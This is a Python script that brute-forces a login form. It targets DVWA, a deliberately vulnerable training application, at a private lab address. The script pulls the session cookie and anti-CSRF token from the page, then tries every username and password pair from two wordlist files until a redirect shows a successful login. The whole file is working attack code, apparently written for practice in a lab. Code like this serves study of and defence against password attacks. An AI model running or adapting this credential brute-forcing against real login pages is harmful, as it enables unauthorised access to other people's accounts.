from bs4 import BeautifulSoup
import requests
import re

# url to attack
url = "http://192.168.56.101/dvwa/login.php"

# get users
user_file = "users.txt"
with open(user_file, "r") as fd:
    users = fd.readlines()

# get passwords
password_file = "passwords.txt"
with open(password_file, "r") as fd:
    passwords = fd.readlines()

# Changes to True when user/pass found
done = False

print(f"Attacking {url}\n")

# Get login page
try:
    r = requests.get(url, timeout=5)
    # Extract session_id (next 2 lines are from https://blog.g0tmi1k.com/dvwa/login/)
    session_id_match = re.search("PHPSESSID=(.*?);", r.headers.get("set-cookie", ""))
    if session_id_match:
        session_id = session_id_match.group(1)
    else:
        print("Session ID not found. Exiting.")
        exit()
except requests.ConnectionError:
    print("Unable to reach server! Quitting!")
    exit()

print(f"Session_id: {session_id}")
cookie = {"PHPSESSID": session_id}

# Prepare BeautifulSoup
soup = BeautifulSoup(r.text, "html.parser")

# Get user_token value
user_token_input = soup.find("input", {"name": "user_token"})
if user_token_input:
    user_token = user_token_input["value"]
else:
    print("User token not found. Exiting.")
    exit()

print(f"User_token: {user_token}\n")

for user in users:
    user = user.rstrip()
    for password in passwords:
        if not done:
            password = password.rstrip()
            payload = {
                "username": user,
                "password": password,
                "Login": "Login",
                "user_token": user_token
            }

            reply = requests.post(url, data=payload, cookies=cookie, allow_redirects=False)

            result = reply.headers.get("Location", "")

            print(f"Trying: {user}, {password}", end="\r")

            if "index.php" in result:
                print(f"\nSuccess! \nUser: {user} \nPassword: {password}")
                done = True
                break
        else:
            break
